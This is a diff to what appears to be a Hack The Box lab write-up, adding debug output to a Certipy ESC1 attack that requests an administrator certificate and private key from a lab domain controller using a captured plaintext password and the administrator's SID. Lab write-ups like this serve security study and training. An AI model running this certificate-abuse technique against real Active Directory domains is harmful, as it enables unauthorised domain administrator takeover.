@@ -1089,15 +1089,29 @@ And now running certipy i see its vulnerable
 https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc1-enrollee-supplied-subject-for-client-authentication
 
 ```python
-❯❯❯ faketime -f +8h certipy-ad req -dc-ip 10.129.229.190 -dc-host dc01.coder.htb -target-ip 10.129.229.190 -target dc01.coder.htb -u e.black@coder.htb -p 'ypOSJXPqlDOxxbQSfEERy300' -ca 'coder-DC01-CA' -template 'ESC1' -upn 'administrator@coder.htb' -sid 'S-1-5-21-2608251805-3526430372-1546376444-500'
+❯❯❯ faketime -f +8h certipy-ad req -dc-ip 10.129.229.190 -dc-host dc01.coder.htb -target-ip 10.129.229.190 -target dc01.coder.htb -u e.black@coder.htb -p 'ypOSJXPqlDOxxbQSfEERy300' -ca 'coder-DC01-CA' -template 'ESC1' -upn 'administrator@coder.htb' -sid 'S-1-5-21-2608251805-3526430372-1546376444-500' -debug
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[+] Nameserver: '10.129.229.190'
+[+] DC IP: '10.129.229.190'
+[+] DC Host: 'dc01.coder.htb'
+[+] Target IP: '10.129.229.190'
+[+] Remote Name: 'dc01.coder.htb'
+[+] Domain: 'CODER.HTB'
+[+] Username: 'E.BLACK'
+[+] Generating RSA key
 [*] Requesting certificate via RPC
-[*] Request ID is 16
+[+] Trying to connect to endpoint: ncacn_np:10.129.229.190[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.129.229.190[\pipe\cert]
+[*] Request ID is 20
 [*] Successfully requested certificate
 [*] Got certificate with UPN 'administrator@coder.htb'
+[+] Found SID in SAN URL: 'S-1-5-21-2608251805-3526430372-1546376444-500'
+[+] Found SID in security extension: 'S-1-5-21-2608251805-3526430372-1546376444-500'
 [*] Certificate object SID is 'S-1-5-21-2608251805-3526430372-1546376444-500'
 [*] Saving certificate and private key to 'administrator.pfx'
+[+] Attempting to write data to 'administrator.pfx'
+[+] Data written to 'administrator.pfx'
 [*] Wrote certificate and private key to 'administrator.pfx'
 ```
 
